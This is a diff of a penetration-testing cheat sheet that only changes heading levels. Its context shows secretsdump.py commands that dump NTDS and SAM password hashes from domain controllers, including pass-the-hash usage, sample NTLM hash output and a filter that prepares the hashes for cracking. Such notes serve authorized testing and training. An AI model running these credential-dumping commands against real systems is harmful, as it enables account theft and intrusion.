@@ -85,13 +85,13 @@ For local authentication, add the `--local-auth` flag to the command.
 
 ### Dump NTDS
 
-#### Remote NTDS
+### Remote NTDS
 
 ```plain
 secretsdump.py <domain>/<domain-or-local-admin>:<password>@<computer-or-domain-controller-ip>
 ```
 
-#### Local NTDS
+### Local NTDS
 
 Also check [NTDS.dit Dump&Extract]({{< ref "ntds-dump" >}}).
 
@@ -141,7 +141,7 @@ secretsdump.py <domain>/<domain-or-local-admin>:<password>@<domain-controller-ip
 secretsdump.py <domain>/<domain-or-local-admin>:<password>@<domain-controller-ip> -just-dc-ntlm -history -user-status
 ```
 
-#### Filter enabled accounts hashcat ready
+### Filter enabled accounts hashcat ready
 
 ```plain
 grep -E 'status=Enabled' secretsdump-users-with-status.txt | awk '{print $1}'
@@ -151,7 +151,7 @@ grep -E 'status=Enabled' secretsdump-users-with-status.txt | awk '{print $1}'
 
 {{%attachments title="Related files" fa_icon_class="far fa-file-video" pattern="secretsdump.mp4"/%}}
 
-#### Dumping NTDS
+### Dumping NTDS
 
 Local Administrator privileges required, can be used against every system you're local administrator at.
 
@@ -181,7 +181,7 @@ The file below is a example of the full output of the command above.
 
 {{%attachments title="Secretsdump example output" fa_icon_class="far fa-file" pattern=".*(txt)"/%}}
 
-#### Example dump all hashes NTLM format
+### Example dump all hashes NTLM format
 
 ```plain
 secretsdump.py offsec.nl/administrator:Welkom1234@10.10.10.16 -just-dc-ntlm
@@ -200,7 +200,7 @@ offsec.nl\janedo:1110:aad3b435b51404eeaad3b435b51404ee:f3fe13546c4c0d2db443a0865
 [*] Cleaning up...
 ```
 
-#### Dump with hash instead of plaintext password
+### Dump with hash instead of plaintext password
 
 ```plain
 $ secretsdump.py offsec.nl/sa.sql@10.10.10.10 -hashes ':55e2eb2ba1c8710ba2530929e3fe5e2f' -just-dc-ntlm
@@ -218,7 +218,7 @@ offsec.nl\user2:1119:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623
 offsec.nl\user3:1120:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
 ```
 
-#### Dump specific user only
+### Dump specific user only
 
 ```plain
 $ secretsdump.py offsec.nl/johndo-adm@10.10.10.10 -just-dc-ntlm -just-dc-user john.do
@@ -256,7 +256,7 @@ Henk:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 [*] Cleaning up... 
 ```
 
-#### Example files SAM/SYSTEM
+### Example files SAM/SYSTEM
 
 Example `SAM` and `SYSTEM` files zipped below.
 
@@ -284,7 +284,7 @@ john_do:19530:aad3b435b51404eeaad3b435b51404ee:6ed6a61234567898f78076f844::: (st
 john_do_adm:19530:aad3b435b51404eeaad3b435b51404ee:2b311d396123456789f280077beee::: (status=Disabled)
 ```
 
-#### Example files NTDS.dit/SYSTEM
+### Example files NTDS.dit/SYSTEM
 
 Example `NTDS.dit` and `SYSTEM` files zipped below.
 
